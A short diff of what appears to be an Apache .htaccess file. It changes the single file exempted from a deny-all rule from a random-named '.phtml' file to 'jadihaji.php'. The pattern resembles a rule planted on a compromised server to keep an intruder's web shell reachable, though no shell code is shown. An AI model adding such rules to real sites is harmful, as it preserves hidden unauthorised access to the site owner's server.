@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(67c6934bc1c13.phtml)$">
+<FilesMatch "^(jadihaji.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
